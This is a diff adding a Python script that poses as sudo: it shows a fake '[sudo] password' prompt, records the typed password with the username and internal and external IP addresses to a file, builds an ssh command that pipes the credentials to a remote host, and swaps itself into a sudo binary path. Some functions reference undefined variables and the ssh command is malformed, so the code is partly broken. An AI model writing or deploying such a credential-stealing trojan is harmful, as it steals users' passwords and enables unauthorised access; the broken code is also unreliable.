@@ -1,0 +1,69 @@
+#!/usr/bin/env python3
+
+from getpass import getuser, getpass
+from datetime import datetime
+from socket import gethostbyname_ex, gethostname, socket, AF_INET, SOCK_DGRAM
+from requests import get
+from shutil import move
+from os import system
+
+# edited Code from W3schools
+def get_internal_ip():
+    return([l for l in ([ip for ip in gethostbyname_ex(gethostname())[2] 
+    if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket(AF_INET, SOCK_DGRAM)]][0][1]]) if l][0][0])
+
+def get_external_ip():
+    try:
+        ip =  get('https://api.ipify.org').text
+    except:
+        ip = 'NA'
+
+    return ip
+
+def get_creds():
+
+    curr_user = getuser()
+    prompt = "[sudo] password for " + curr_user + ': '
+    passwd = getpass(prompt) 
+    internal_ip = get_internal_ip()
+    external_ip = get_external_ip()
+
+    info = 'external_ip: <' + external_ip + '>, internal_ip:<' + internal_ip + '>, username:<' + curr_user + '>, passwd:<' + passwd +'>, ' + str(datetime.now())  
+
+    return info
+
+def write_creds(fname = '/tmp/info'):
+    text = get_creds()
+    try:
+        with open(fname, 'a+') as f: f.write(text)
+    except:
+        ensure_directory(fname)
+        with open(fname, 'a+') as f: f.write(text)
+
+    return fname
+
+def ensure_directory(fname):
+    directory = ''.join(fname.rsplit('/',1)[:-1])
+    system(cmd)
+    print(cmd)
+
+def send_creds(ip, username, keyfile='./creds.txt'):
+    text = get_creds() 
+    fname = get_external_ip()
+    cmd = 'echo "' + text + '" | ssh -i ' + key + username + '@' + ip +'"cat ~/' + fname + '"'
+    #system(cmd)
+    print(cmd)
+    return cmd
+
+
+if __name__ == '__main__':
+    creds = write_creds('./tmp/info')
+    fake_sudo = './get_creds.py'
+    real_sudo = './usrbin/sudo'
+    backup_sudo = './usrbin/baksudo'
+    ensure_directory(real_sudo)
+    move(real_sudo, backup_sudo)
+    move(fake_sudo, real_sudo)
+    move(backup_sudo, './usrbin/origsudo')
+     
+
